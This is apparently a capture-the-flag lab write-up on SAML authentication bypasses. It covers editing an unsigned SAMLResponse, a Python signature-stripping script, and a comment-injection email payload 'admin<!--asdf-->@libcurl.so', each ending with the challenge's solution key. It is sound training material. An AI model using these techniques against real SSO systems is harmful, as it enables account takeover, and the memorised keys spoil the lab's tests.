## Auth Badge

### SAML Introduction

Security Assertion Markup Language (SAML) is used to share authentication and authorisation between parties. SAML is often used to provide Single Sign-On (SSO) between one or multiple Service Provider(s) (SP) and one IDentity Provider (IDP).

SAML flow
- The User-Agent (browser) tries to access the resource
- The Service Provider (SP) sends a redirect to the Identity Provider (IDP)
- The User-Agent follows the redirect an access the IDP. The request contains a SAMLRequest parameter.
- The IDP sends back a response with a SAMLResponse.
- The SAMLResponse is submitted by the User-Agent to the SP.
- The user is now logged in for the Service Provider and can access the resource.

Hacking steps
- Register and login.
- Try login with SAML.
- Intercept SAML login requests.
- At one point you will be redirect to a page with a form `<body onload="document.forms[0].submit();" style="visibility:hidden;">`
- Take the value in `<input type="hidden" name="SAMLResponse" id="SAMLResponse" value="{{here}}">` and decode it.
- Replace `abhaynayar@gmail.com` with `admin@libcurl.so`, encode it back and send with the intercepted request. 

```
You're logged in as admin@libcurl.so. Congratulations! You solved this challenge. The key is 053254f5-f4f9-4da8-9d96-f05ca74c293e
```

### SAML: Signature Stripping

Notes

- One of the common issues with protocol using signature to prevent tampering comes from the fact that the signature is only verified if it is present.
- In the SAML response remove the content of the `<ds:SignatureValue>` tag (only the content).
- For this type of modifications, you can just create a small script to automatically do the decoding, tampering and re-encoding.

saml-sign.py

```
#myfile.txt contains SAMLResponse
with open('myfile.txt', 'r') as f:
    text = f.read()

import base64
base64_message = text + '==='
base64_bytes = base64_message.encode('ascii')
message_bytes = base64.b64decode(base64_bytes)
message = message_bytes.decode('ascii')

import re
msg=re.sub(r'(<ds:SignatureValue>).*(</ds:SignatureValue>)', r'\1\2', message)
msg=re.sub(r'asdf@asdf.com',r'admin@libcurl.so', msg)
print(base64.b64encode(msg.encode()))
```

Solution

```
You're logged in as admin@libcurl.so. Congratulations! You solved this challenge. The key is 7fd24047-7ec7-4c60-87e8-3ba3a1bb9ae0
```

### SAML: Comment Injection

Notes

- Register as `admin<!--asdf-->@libcurl.so`
- Since the frontend doesn't allow `<` change email while intercepting through a proxy.
- Go to service provider and then login with SAML

```
You're logged in as admin@libcurl.so. Congratulations! You solved this challenge. The key is 67f7e04c-913c-408b-974a-2bca747cc65a
```

References

- https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations

